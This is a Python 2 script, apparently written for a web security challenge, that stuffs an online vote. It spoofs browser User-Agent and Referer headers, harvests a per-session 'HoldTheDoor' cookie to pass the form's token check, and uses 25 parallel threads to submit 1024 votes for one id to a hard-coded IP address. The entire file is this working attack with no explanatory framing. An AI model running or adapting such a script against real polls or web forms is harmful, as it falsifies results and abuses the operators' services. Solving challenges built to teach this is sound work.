import urllib2, urllib,cookielib
import multiprocessing.pool as npool
from multiprocessing import Lock

#configuration start
id_number=40
allowed_number_of_threads_at_one_time=25
votes=1024
#configuration end

#initialization start
vote_counter=0
lock=Lock()
f_lock=Lock()
pool = npool.ThreadPool(allowed_number_of_threads_at_one_time)
#initialization end

def thread_it():
    cj = cookielib.CookieJar()
    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
    opener.addheaders=[
        ('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36'),
        ('Referer', 'http://173.246.108.142/level2.php'),
    ]
    session = opener.open('http://173.246.108.142/level2.php')
    if session.getcode() == 200:
        for cookie in cj:
            if cookie.name=='HoldTheDoor':
                params = { 'id': id_number, 'holdthedoor': 'Submit', 'key': cookie.value }
        url_params = urllib.urlencode(params) # url encode the parameters
        post=opener.open('http://173.246.108.142/level2.php', url_params)
        lock.acquire()
        try:
            if post.getcode() == 200:
                global vote_counter
                vote_counter+=1
                print "Vote\033[1m", vote_counter, "\033[0mhas been submitted!"
            else:
                print "Vote", vote_counter, "failed with status", post.getcode()
        finally:
            lock.release()
    else:
        f_lock.acquire()
        try:
            print "Failed to open a session, returned with error code:", session.getcode()
        finally:
            f_lock.release()
    opener.close()

#instructions start
print "Please standby..."
#instruction end

#threading start
for i in range (votes):
    t = pool.apply_async(thread_it,args=())
pool.close()
pool.join()
#threading end

#Summary start
print "\033[94m# of votes that were requested:", votes
print "# of successful votes:", vote_counter, "\033[0m"
if (votes - vote_counter) != 0:
    print "\033[93m# of failed votes:", votes - vote_counter, "\033[0m"
#Summary end 
